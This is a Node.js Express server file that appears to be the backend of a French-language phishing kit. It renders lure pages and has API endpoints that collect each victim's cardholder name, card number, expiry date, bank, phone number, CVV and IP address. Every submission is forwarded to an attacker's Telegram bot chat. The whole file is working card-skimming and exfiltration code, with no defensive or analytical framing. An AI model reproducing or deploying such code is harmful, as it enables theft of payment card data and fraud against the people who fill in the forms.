const express = require('express');
const path = require('path');
const https = require('https');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '../backend-nodejs/views'));
app.use(express.static(path.join(__dirname, '../backend-nodejs/public')));

app.use((req, res, next) => {
  req.clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'N/A';
  req.userAgent = req.headers['user-agent'] || 'N/A';
  next();
});

const sendTelegram = (text) => {
  return new Promise((resolve, reject) => {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) return reject(new Error('Config missing'));

    const payload = JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' });
    const opts = {
      hostname: 'api.telegram.org',
      path: `/bot${token}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          reject(e);
        }
      });
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
};

app.get('/', (req, res) => res.render('index'));
app.get('/accords', (req, res) => res.render('accords'));
app.get('/premiere', (req, res) => res.render('premiere'));
app.get('/deuxieme', (req, res) => res.render('deuxieme'));

app.post('/api/send-agreement', async (req, res) => {
  try {
    await sendTelegram(`<b>✅ ACCORD</b>\n⏰ ${new Date().toLocaleString('fr-FR')}\n🌐 IP: ${req.clientIP}`);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ success: false, error: e.message });
  }
});

app.post('/api/send-form', async (req, res) => {
  try {
    const { titulaire, cardNumber, expiryDate, bank, telephone } = req.body;
    await sendTelegram(`<b>💳 DONNÉES</b>\n👤 ${titulaire}\n💳 ${cardNumber}\n📅 ${expiryDate}\n🏦 ${bank}\n📱 ${telephone}\n🌐 IP: ${req.clientIP}`);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ success: false, error: e.message });
  }
});

app.post('/api/send-cvv', async (req, res) => {
  try {
    const { cvv, titulaire, cardNumber, expiryDate } = req.body;
    await sendTelegram(`<b>🔐 CVV</b>\n🔑 ${cvv}\n👤 ${titulaire}\n💳 ${cardNumber}\n📅 ${expiryDate}\n🌐 IP: ${req.clientIP}`);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ success: false, error: e.message });
  }
});

app.get('/api/health', (req, res) => res.json({ status: 'OK', environment: 'vercel' }));

module.exports = app;
